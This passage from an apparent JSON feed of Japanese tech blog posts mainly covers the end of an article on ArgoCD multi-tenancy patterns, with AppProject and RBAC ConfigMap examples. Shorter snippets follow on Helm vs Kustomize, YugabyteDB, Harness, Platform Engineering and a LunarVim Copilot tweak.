<許否>    # 認証済みグループにロールを紐付ける    g, <グループ名>, role:<ロール名>  scopes: \\"[groups]\\"RBAC Configuration - Argo CD - Declarative GitOps CD for Kubernetesオススメしない理由CLモードなArgoCDのAppProjectテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見でオススメしませんでした。 アーキテクチャ特性  メリット ⭕️                                                                                   デメリット \xd7                                                                                                                                                                                                                      デメリットの回避策                                                                                                                                                            拡張性                 テナントを増やすためにNamespaceとAppProjectを用意するだけでよく、作業量が少ない。             -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                    安全性(セキュリティ)        NetworkPolicyでNamespace間の名前解決を不可能にすれば、他のNamespaceからの通信を遮断できる。   -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                             保守性                 ArgoCD用Clusterの管理者が単一のClusterを保守すればよい。(例：アップグレード、機能修正、など)  AppProjectはNamespacedスコープなカスタムリソースのため、ClusterスコープなKubernetesリソースを他のテナントと共有しないといけない。そのため、ClusterスコープなKubernetesリソース (特にCRD) の変更は全てのテナントに影響する。  ➡︎  ArgoCDのアップグレード時 (CRDの変更時) は、ついでにKubernetesもアップグレードしたい。新しいClusterを別に作成し、そこで新ArgoCDを作成すれば一石二鳥である。                 性能                  -                                                                                             Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                                                                                                                                                ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                                                                                        信頼性                 -                                                                                             ClusterまたはArgoCDで障害が起こると、これは全てのテナントに影響する。                                                                                                                                                            ➡︎  代わりにNodeやArgoCDを十分に冗長化して可用性を高めれば、影響を緩和できる。ただ、そもそもの影響範囲が大きすぎる\uD83D\uDE2D                                           05-02. NSモードなArgoCD - ★★NSモードなArgoCDとはNSモードなArgoCDの場合、前述のCLモードとは異なり、各AppProjectテナント間でArgoCDを占有します。例えば、AppProjectテナントとして、プロダクト別のNamespace (foo、bar、baz) とAppProject (foo、bar、baz) を用意します。各AppProjectテナントに、ArgoCDと関連するKubernetesリソース (例：ConfigMap) を配置します。各プロダクトチームは、AppProjectテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesAppProjectCLモードと同様にして、AppProjectに所属するApplicationによるマニフェストのデプロイを制限できます。例えば、以下のような実装になります。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # App-Of-Appsパターンの場合に使用する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    - namespace: \\"*\\"      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com# NSモードでは設定が不要である# sourceNamespaces:#   - fooApplicationを操作するログインユーザーが、無認可のNamespaceやClusterをデプロイ先に指定できないように、.spec.destinationキーで制限しています。前述のCLモードとは異なり、NSモードなArgoCDは自身が所属するNamespaceのApplicationのみにアクセスできます。そのため、.spec.sourceNamespacesキーでマニフェストのデプロイを制限する必要はありません。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesProjects - Argo CD - Declarative GitOps CD for KubernetesArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)CLモードと同様にして、argocd-cmd-params-cmでは、ArgoCDの各コンポーネントのコンテナの引数を設定できます。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# NSモードでは設定が不要である# application.namespaces: \\"*\\"前述の通り、.application.namespacesキーは、argocd-serverとapplication-controllerの--application-namespacesオプションに相当します。前述のCLモードとは異なり、NSモードなArgoCDは自身が所属するNamespaceのApplicationのみにアクセスできますそのため、.application.namespacesキーでNamespaceに関する認可を設定する必要はありませんもちろん、Podのコンテナ引数にも設定は不要です。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetesログインユーザー用ConfigMap (argocd-rbac-cm)CLモードと同様にして、argocd-rbac-cmでは、Applicationを操作するログインユーザーが、無認可のAppProjectやNamespaceに所属するApplicationを操作できないように制限します。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  # デフォルトのロール  # @see https://github.com/argoproj/argo-cd/blob/master/assets/builtin-policy.csv#L9-L16  policy.default: role:readonly  policy.csv: |    p, role:app, *, *, app/*/*, allow    p, role:infra, *, *, infra/*/*, allow    g, app-team, role:app    g, infra-team, role:infra  scopes: \\"[groups]\\"認証済みグループ (app-team、infra-team) に対して、無認可のAppProject (app、infra) に所属するApplicationを操作できないように、認可スコープを制限しています。特にオススメした理由NSモードなArgoCDのAppProjectテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見で 特にオススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                  デメリット \xd7                                                                                                                                                                                                                      デメリットの回避策                                                                                                                                                            拡張性                 テナントを増やすためにNamespaceとAppProjectを用意するだけでよく、作業量が少ない。            -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                    安全性(セキュリティ)        NetworkPolicyでNamespace間の名前解決を不可能にすれば、他のNamespaceからの通信を遮断できる。  -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                             保守性                 単一のClusterを保守すればよい。(例：アップグレード、機能修正、など)             AppProjectはNamespacedスコープなカスタムリソースのため、ClusterスコープなKubernetesリソースを他のテナントと共有しないといけない。そのため、ClusterスコープなKubernetesリソース (特にCRD) の変更は全てのテナントに影響する。  ➡︎  ArgoCDのアップグレード時 (CRDの変更時) は、ついでにKubernetesもアップグレードしたい。新しいClusterを別に作成し、そこで新ArgoCDを作成すれば一石二鳥である。                 性能                  -                                                                                            Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                                                                                                                                                ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                                                                                        信頼性                 テナントごとにArgoCDを占有しており、他のArgoCDから障害の影響を受けない。                     Clusterで障害が起こると、これは全てのテナントに影響する。                                                                                                                                                                        ➡︎  代わりに、Nodeを十分に冗長化して可用性を高める。いずれかのインスタンスで障害が起こっても、正常なインスタンスでArgoCDが稼働できる。                         AppProjectテナント例の一覧NSモードなArgoCDを採用する場合、AppProjectテナント例を解説していきます。前述の通り、AppProjectテナントが二重テナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持つことに留意してください。なお、オススメするものを ★ としています。    テナント例(二重テナント)    オススメ  Namespace(第一テナント)    AppProject(第二テナント)  テナント例1      プロダクトの実行環境別      プロダクトの実行環境別          テナント例2      プロダクト別      プロダクトの実行環境別      ★    テナント例3      プロダクト別      プロダクトのサブチーム別      ★★    ▶ Namespaceの分割パターンについて\\"管理チーム別\\" (今回でいうプロダクト別) というNamespaceの分割パターンは、様々な著名な書籍やブログで紹介されています\uD83D\uDC40  Amazon | Kubernetes in Action | Luksa, Marko | Software DevelopmentKubernetes best practices: Specifying Namespaces in YAML | Google Cloud Blogテナント例1Namespace (プロダクトの実行環境別)、AppProject (プロダクトの実行環境別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。この場合に、プロダクトの実行環境別にNamespace (dev、tes) とAppProject (dev、tes) を用意します。オススメしなかった理由テナント例1には、以下のメリデメがあります。独断と偏見でオススメしませんでした。 アーキテクチャ特性  メリット ⭕️                                                                                                                                     デメリット \xd7                                                                                                                                   デメリットの回避策                                                                                       拡張性                 -                                                                                                                                               ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりやすい。その時点で、AppProjectテナントの増やせなくなる。  ➡︎  例えばAWS EKSの場合、Node数を増やしたり、Nodeのスペックを上げる。ただ、お金がかかる\uD83D\uDE2D       安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可の実行環境別AppProjectに所属するApplicationを操作できないように制限できる。  -                                                                                                                                             ➡︎  -                                                                                                        保守性                 異なる実行環境に関するApplicationが共存しておらず、別のargocd-serverから操作することになるため、実行環境間の選択ミスが起こりにくい。            -                                                                                                                                             ➡︎  -                                                                                         テナント例2 - ★Namespace (プロダクト別)、AppProject (プロダクトの実行環境別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo、bar) 、プロダクトの実行環境別にAppProject (dev、tes) を用意します。オススメした理由テナント例2には、以下のメリデメがあります。独断と偏見で オススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                デメリット \xd7                                                                                                                                           デメリットの回避策                                                                                 拡張性                 ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりにくい。                                   -                                                                                                                                                     ➡︎  -                                                                                         安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可の実行環境別AppProjectを操作できないように制限できる。  -                                                                                                                                                     ➡︎  -                                                                                                  保守性                 -                                                                                                                          異なる実行環境に関するApplicationが共存しており、同じargocd-server (ダッシュボード) から操作することになるため、実行環境間の選択ミスが起こりやすい。  ➡︎  ダッシュボードにはApplicationのフィルタリング機能があるため、選択ミスを回避できる。 テナント例3 - ★★Namespace (プロダクト別)、AppProject (プロダクトのサブチーム別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo、bar) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。特にオススメした理由テナント例3には、以下のメリデメがあります。独断と偏見で 特にオススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                                       デメリット \xd7                                                                                                                                           デメリットの回避策                                                                                 拡張性                 ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりにくい。                                                          -                                                                                                                                                     ➡︎  -                                                                                         安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可のサブチーム別AppProjectに所属するApplicationを操作できないように制限できる。  -                                                                                                                                                     ➡︎  -                                                                                                  保守性                 -                                                                                                                                                 異なる実行環境に関するApplicationが共存しており、同じargocd-server (ダッシュボード) から操作することになるため、実行環境間の選択ミスが起こりやすい。  ➡︎  ダッシュボードにはApplicationのフィルタリング機能があるため、選択ミスを回避できる。 06. どのような誤った操作を防いでくれるのかそろそろ解説を読むのがしんどい方がいるのではないでしょうか。『君がッ、泣くまで、解説をやめないッ！』AppProjectテナントとNamespacedスコープモードがマニフェストのデプロイをどのように制限するのかについて、例を挙げて解説します。ここでは、以下のAppProjectを作成したと仮定します。AppProjectテナントが二重テナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持つことに留意してください。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  # appチーム  name: app  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # Namespace (foo) へのデプロイを許可する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"      # プロダクト用Clusterに関する認可を設定する      # Namespace (app) へのデプロイを許可する    - namespace: app      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.comapiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  # infraチーム  name: infra  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # Namespace (foo) へのデプロイを許可する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    # Namespace (infra) へのデプロイを許可する    - namespace: infra      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.comマニフェストのデプロイ制限プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。AppProjectテナントは、例えば 赤線 の方法で、マニフェストのデプロイを制限します。マニフェストをデプロイできる場合マニフェストを正しくデプロイする場合、AppProjectテナントはこれを制限しません。(1) argocd-serverは、argocd-cmd-params-cmからアクセスできるNamespaceを取得します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# 設定しないことで、argocd-serverは同じNamespaceにしかアクセスできなくなる。# application.namespaces: \\"*\\"(2) fooプロダクトのinfraチームが、argocd-serverを操作します。(3) argocd-serverは、argocd-rbac-cmからApplication操作に関する認可スコープを取得しますapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  policy.default: role:readonly  policy.csv: |    p, role:app, *, *, app/*/*, allow    p, role:infra, *, *, infra/*/*, allow    g, app-team, role:app    g, infra-team, role:infra  scopes: \\"[groups]\\"(4) infraチームは、認可されたAppProjectに所属するApplicationを操作します。(5) infraチームは、Dev環境のfooプロダクト用ClusterのNamespace (infra) にマニフェストをデプロイできます。(\uD83D\uDEAB制限例1) 無認可のNamespaceでApplicationを作成しようとした場合例えば、fooプロダクトのinfraチームが無認可のNamespace (bar) でApplicationを作成しようとします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。namespace bar is not permitted in project \'infra-team\'無認可のNamespaceでApplicationを作れてしまうと、そのApplicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/test/e2e/app_management_ns_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub(\uD83D\uDEAB制限例2) 無認可のAppProjectでApplicationを作成しようとした場合例えば、fooプロダクトのinfraチームが、無認可のAppProject (app) でApplicationを作成しようとします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。Application referencing project \'app\' which does not exist任意のAppProjectでApplicationを作成できてしまうと、そのApplicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08(\uD83D\uDEAB制限例3) 無認可のClusterをデプロイ先に指定しようとした場合例えば、fooプロダクトのinfraチームがApplicationを操作し、無認可のプロダクト用Cluster (bar-cluster) をデプロイ先として指定しようします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。application destination{https://bar-cluster.gr7.ap-northeast-1.eks.amazonaws.com infra} is not permitted in project \'infra-team\'任意のClusterをデプロイ先に指定できてしまうと、Applicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/util/argo/argo_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub(\uD83D\uDEAB制限例4) 無認可のNamespaceをデプロイ先に指定しようとした場合例えば、fooプロダクトのinfraチームがApplicationを操作し、無認可のNamespace (app) をデプロイ先に指定しようします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。application destination{https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com app} is not permitted in project \'infra-team\'任意のNamespaceをデプロイ先に指定できてしまうと、そのApplicationから無認可のNamespaceにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/util/argo/argo_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub▶ AppProjectで設定できる認可の種類についてargocd-serverとapplication-controllerでデプロイできるKubernetesリソースの種類 (.spec.clusterResourceWhitelistキー、.spec.namespaceResourceWhitelistキー、など)repo-serverでポーリングできるリポジトリ (.spec.sourceReposキー)apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  clusterResourceWhitelist:    - group: \\"*\\"      kind: \\"*\\"  namespaceResourceWhitelist:    - group: \\"*\\"      kind: \\"*\\"  sourceRepos:    - \\"*\\"  ...\\"AppProjectテナントによるマニフェストのデプロイ丸ごとの制限\\" という観点でテーマが異なるため、本記事では言及しませんでした\uD83D\uDE47\uD83C\uDFFB‍  Projects - Argo CD - Declarative GitOps CD for KubernetesDeclarative Setup - Argo CD - Declarative GitOps CD for KubernetesカスタムリソースのReconciliation制限プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。AppProjectテナントは、例えば 赤線 の方法で、ArgoCD系カスタムリソースに対するapplication-controllerのReconciliationを制限します。ArgoCD系カスタムリソースをReconciliationできる場合正しいNamespaceに対してReconciliationを実行する場合、AppProjectテナントはこれを制限しません。(1) application-controllerは、argocd-cmd-params-cmから自身がアクセスできるNamespaceを取得します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# 設定しないことで、application-controllerは同じNamespaceにしかアクセスできなくなる。# application.namespaces: \\"*\\"(2) application-controllerは、同じNamespaceに所属するArgoCD系カスタムリソースに対して、Reconciliationを実行します。(\uD83D\uDEAB制限例1) 無認可のNamespaceにReconciliationを実行しようとした場合例えば、application-controllerがReconciliationの対象とするNamespaceを選ぼうとしているとします。すると、application-controllerは内部で検証メソッドを実行し、無認可のNamespace (bar) は選ばないようにします。argo-cd/controller/appcontroller_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub07. おわりにKubernetesのマルチテナントパターンとArgoCDでのパターン実践をもりもり布教しました。あらゆる面からマニフェストのデプロイを制限してくれる、AppProjectテナントの素晴らしさが伝わりましたでしょうか。KubernetesのマルチテナントパターンをArgoCDでどう実践するべきか、について困っている方の助けになれば幸いです\uD83D\uDC4D謝辞本記事のタイトルは、私が崇拝しているドメイン駆動設計の書籍 \\"実践ドメイン駆動設計\\" から拝借しました\uD83D\uDE4Fまた、ArgoCDでのパターン実践の収集にあたり、以下の方からの意見も参考にさせていただきました。@toversus26 さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍GitOps Cookbook (English Edition)作者:Vinto, Natale,Bueno, Alex SotoO\'Reilly MediaAmazonGitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux作者:Yuen, Billy,Matyushentsev, Alexander,Ekenstam, Todd,Suen, JesseManning PublicationsAmazon","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/08/18/110646","isoDate":"2023-08-18T02:06:46.000Z","dateMiliSeconds":1692324406000,"authorName":"Hiroki Hasegawa","authorId":"hiroki-hasegawa"},{"title":"kubernetesのマニフェスト管理 比較検討（Helm/Kustomize）","contentSnippet":"はじめに実務において、kubernetesのマニフェスト作成（管理）の方法としてHelm or Kustomizeという選択肢がとられている。ここでは、クライアント組織への導入したときの話をしたいと思う。クライアント組織の要求事項と特性を整理した上で、どちら（または同時使用）が適切か判断するための調査を行うHelm : https://helm.sh/Kustomize : https://kustomize.io/ TL;DR個人的にはHelmの使用を推奨したいアプリケーション / インフラ / SREと多くのレイヤーの人が関わる組織統制を考慮したときに、...","link":"https://zenn.dev/yokoo_an209/articles/6d23ee506bc007","isoDate":"2023-08-17T13:15:01.000Z","dateMiliSeconds":1692278101000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"YugabyteDBのドキュメントを全部読む Day5","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > YB-Master serviceを読みました。今回はArchitecture > Core functions > Universe creationを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Universe creationYugabyteDBのユニバース作成は複数のステップを含む。Start YB-MastersYBユニバース作成の最初のステップはレプリケーションファクターで指定された数だけYB-Masterを作成することである。作成されたYB-Masterはそれぞれを認識している。YB-Masterはユニバース内でユニークなID(UUID)をそれぞれに割り当て、それぞれを認識しあったあとにリーダーエレクションを実行する。このステップの終りにYB-Masterの中のひとつがリーダーとして確立される。Start YB-TServersノードの数だけYB-TServerを起動し、それぞれにマスターのアドレスを渡す。それぞれのYB-TServerはマスターにハートビートを送信し、正常に動作していることを確認する。ハートビートはYB-TServerが現在ホストしているタブレットとその負荷情報についても通信するが、この時点ではタブレットにデータは登録されていない。Examples4ノードからなるYBユニバースにテーブルを作成する場合について考える。テーブルのレプリケーションファクターは3とする。3つのマスターがcreateモードで起動される。これはマスターがすでに起動しているために発生するエラーを防ぐために明示的に実行される。リーダーエレクションを実行し、リーダーを選出する。YB-TServerが起動し、全てのYB-TServerがマスターにハートビートを送信する。","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/5_core_functions_universe_creation","isoDate":"2023-08-16T13:49:19.000Z","dateMiliSeconds":1692193759000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"PaLM API for textで作るGoogle Cloudコストチェッカー","contentSnippet":"前段 Sreake事業部の橋本です。 Generative AIをSRE活動に活用する場合に大きく分けて以下のような2ケースが考えられます。これまで1つめのtoil削減の実装をGenerative AIに含まれる学習デー […]The post PaLM API for textで作るGoogle Cloudコストチェッカー first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/google-cloud-cost-check-with-palm-api-for-text/","isoDate":"2023-08-16T05:06:08.000Z","dateMiliSeconds":1692162368000,"authorName":"Sreake","authorId":"Sreake"},{"title":"WezTerm で快適な WSL2 環境にする","contentSnippet":"家の自分用 Laptop はずっと Linux を使ってきましたが、数か月前に Inspiron 14 に買い替えたタイミングで Ubuntu 22.04 にしてからやっぱり不便だなあとも思っていました。(InputMethod の切","link":"https://blog.1q77.com/2023/08/wezterm-on-windows/","isoDate":"2023-08-12T11:07:01.000Z","dateMiliSeconds":1691838421000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"HarnessでGKEクラスタにCDパイプラインを構築","contentSnippet":"はじめに実務においてHarnessを使用する機会があったので、お試しがてらGKEクラスタ上にCDパイプラインの構築を行います。（※なお、今回はHarnessの使用に焦点を当てているため、CIの実装については考慮しておりません）【対象】Harnessに初めて触れる方 Harnessとは？一言でいうと、CI/CDツールhttps://harness.dxable.com/多様なクラウドプロバイダーと連携可能な点が個人的には最大の魅力だと思っています！ 使用環境今回、実践する環境は以下です。Artifact RegistoryGithub C...","link":"https://zenn.dev/yokoo_an209/articles/a5c818221bed68","isoDate":"2023-08-10T09:06:25.000Z","dateMiliSeconds":1691658385000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"SREからPlatform Engineerへの拡大 というタイトルで登壇しました","contentSnippet":"概要Cloud Operator Days Tokyo 2023 で SREからPlatform Engineerへの拡大 というテーマでの登壇を果たしました。オンデマンド配信なのでいずれ見れるようになると思います。今回のサブタイトルは【運用の新時代】とし、それにちなんでメインタイトルを考えました。資料の作成過程で、話したい内容がどんどんと増えてきてしまい、20分という限られた時間での発表が一番の課題となりました。内容の整理に際して、具体と抽象 ―世界が変わって見える知性のしくみ という本を参照し、大変役立ちました。具体と抽象作者:細谷 功dZERO（インプレス）Amazon資料このブログでは、Cloud Operator Days Tokyo 2023での登壇内容をまとめております。資料作成時に参照したさまざまな参考情報も掲載していますので、読者の皆様が別途情報を探す手間を省けるよう心掛けました。ぜひ、本ブログをご活用ください。文字多くて分かりにくいのは分かってます。脳内整理はできているのですが資料を読みやすくすると20分に何も収まらず...。 speakerdeck.com参考文献O’Reilly Japan – SRE サイトリライアビリティエンジニアリングあなたらしくSREO’Reilly Japan – サイトリライアビリティワークブックO’Reilly Japan – SREの探求SRE at Google: How to structure your SRE team | Google Cloud BlogレトロスペクティブガイドWhat Is Platform Engineering?Top Strategic Technology Trends for 2023: Platform EngineeringMaking the Business Case for a Dedicated Platform Engineering TeamSRE NEXTPlatform Engineering Meetupチームトポロジー　価値あるソフトウェアをすばやく届ける適応型組織設計The History of DevOps ReportsEffective DevOpsオブザーバビリティ・エンジニアリングWebエンジニアのための監視システム実装ガイド","link":"https://syu-m-5151.hatenablog.com/entry/2023/08/10/150412","isoDate":"2023-08-10T06:04:12.000Z","dateMiliSeconds":1691647452000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"AWS Control Tower 徹底調査","contentSnippet":"AWS Control Tower とは AWS Control Tower とは Landing Zone を実装するための AWS のマネージドサービスです。統制を取りつつマルチアカウントを管理する仕組みです。 La […]The post AWS Control Tower 徹底調査 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/learn-about-aws-control-tower/","isoDate":"2023-08-10T05:52:55.000Z","dateMiliSeconds":1691646775000,"authorName":"Sreake","authorId":"Sreake"},{"title":"HarnessでGKEクラスタにCDパイプラインを構築する","contentSnippet":"はじめに実務においてHarnessを使用する機会があったので、お試しがてらGKEクラスタ上にCDパイプラインの構築を行います。（※なお、今回はHarnessの使用に焦点を当てているため、CIの実…","link":"https://qiita.com/yokoo-an209/items/57e2e4c00394c9da85f7","isoDate":"2023-08-10T05:22:38.000Z","dateMiliSeconds":1691644958000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"2023年8月10日現在 でLunarVim と Copilot.lua でのマルチラインサポートの改善方法 ","contentSnippet":"github.comLunarVimユーザーとして、私はNeovimでcopilot.luaを頻繁に利用しています。しかし、マルチラインのサポートに関してはいくつかの課題がありました。もっというとどこかのタイミングでCopilotが一行ずつしかサジェストされなくなりました。この問題に対して、一部のコードを修正することで、この課題を解決する方法を見つけました。問題点Copilot.lua(Copilot.vimも同様に)の中のagent.jsには、マルチライン入力の停止点を示すコード h.stop=[\\"\\\\n\\"] が含まれています。この設定により、一部の場面でマルチラインサポートが期待通りに動作しないことがありました。解決方法私が採用した方法は、このh.stop=[\\"\\\\n\\"]をh.stop=[\\"\\\\n\\\\n\\\\n\\"]に変更することです。この小さな変更により、マルチラインのサポートが大幅に向上します。以下のコマンドを実行することで、この変更を簡単に適用することができます。MAC でのsed 利用なのでこのようなコマンドになります。各環境で合わせていただきたいです。sed -i \'\' \'s/h\\\\.stop=\\\\[\\"\\\\\\\\\\\\\\\\n\\"\\\\]/h\\\\.stop=\\\\[\\"\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\"\\\\]/\' ~/.local/share/lunarvim/site/pack/lazy/opt/copilot.lua/copilot/dist/agent.js変更が正しく適用されたかどうかを確認するには、以下のコマンドを実行します。grep -o \'.\\\\{30\\\\}h.stop=\\\\[.\\\\{30\\\\}\' ~/.local/share/lunarvim/site/pack/lazy/opt/copilot.lua/copilot/dist/agent.js結果この変更を適用した後、マルチラインサポートが明らかに向上しました。興味があれば最初に紹介したIssue に動画が添付されていたのでご覧ください。LunarVimとCopilot.luaの組み合わせは非常に強力ですが、小さな調整によりさらに快適に使うことができます。このハックが他のユーザーにも役立つことを願っています。後日談この変更を適用した後でマルチラインサポートは向上したのですが一部条件ではまだ、vscodeのような挙動ができません。","link":"https://syu-m-5151.hatenablog.com/entry/2023/08/10/021934","isoDate":"2023-08-09T17:19:34.000Z","dateMiliSeconds":1691601574000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"SREからPlatform Engineerへの拡大","contentSnippet":"SREからPlatform Engineerへの拡大 というタイトルで登壇してきました\\r\\rCloud Operator Days Tokyo 2023 運用の新時代　〜Effortless Operation〜\\rhttps://cloudopsdays.com/\\r\\rクラウドインフラ運用技術者のための年次イベント「Cloud Operator Days Tokyo 2023」の見所を紹介\\rhttps://cloud.watch.impress.co.jp/docs/news/1518302.html\\r\\rSREからPlatform Engineerへの拡大 というタイトルで登壇しました - じゃあ、おうちで学べる  https://syu-m-5151.hatenablog.com/entry/2023/08/10/150412 \\r\\r登壇しかないので20分しかないのでｷﾞｭｯとしてしまいました。","link":"https://speakerdeck.com/nwiizo/srekaraplatform-engineerhenokuo-da","isoDate":"2023-08-09T04:00:00.000Z","dateMiliSeconds":1691553600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Cloud Run を活用した Pull Request 単位での Ad hoc 開発環境作成","contentSnippet":"きっかけ 開発時、feature ブランチの Pull Request （以下、PR）ごとに実行環境が準備されると便利だよねというところから、PR ごとに開発環境を構築される仕組みを作ることになりました。 使用技術スタッ […]The post Cloud Run を活用した Pull Request 単位での Ad hoc 開発環境作成 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/pull-request-based-adhoc-env/","isoDate":"2023-08-09T03:10:37.000Z","dateMiliSeconds":1691550637000,"authorName":"Sreake","authorId":"Sreake"},{"title":"YugabyteDBのドキュメントを全部読む Day4","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > YB-TServer serviceを読みました。今回はArchitecture > Key Concepts > YB-Master serviceを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。YB-Master serviceYB-Masterサービスはテーブルやそのタブレットの場所、ユーザー・ロールの権限といったシステムのメタデータとレコードの管理を行っている。それに加えYB-Masterはロードバランシングやレプリケーションの開始といったバックグラウンドオペレーションの管理や、テーブルのCREATEやALTER、DROPといった様々な管理オペレーションの責任を持つ。YB-MasterはRaft Groupを組むことで高可用性を実現し、またテーブルに対するI/Oの単一障害点にならない。Functions of YB-MasterYB-Masterはシステムの重要な機能を複数持っている。Coordination of universe-wide administrative operationsCREATE TABLEやALTER TABLE、DROP TABLEといったユーザーからのリクエスト処理やバックアップの実行などUniverseをまたぐオペレーション実行の調整を担当している。YB-Masterではこれらのオペレーションがテーブルを保持するYB-TServerの状態に関わらず、全てのテーブルに伝搬されることを保証する。YugabyteDBは分散システムのため、Universeをまたぐ処理中にYB-TServerに障害が発生し一部のタブレットへの適用に失敗してもオペレーションの結果に問題が発生しないことが重要だからである。Storage of system metadataそれぞれのYB-Masterではネームスペースやテーブル、ロール、パーミッション、YB-TServerへ割り当てたテーブル情報を含むシステムメタデータを保存している。これらのシステムレコードはYB-Masterを対象にRaftグループを組みレプリケーションすることで冗長性を実現している。またシステムレコードはYB-Masterが管理するDocDBに保存される。Authoritative source of tablet assignments to 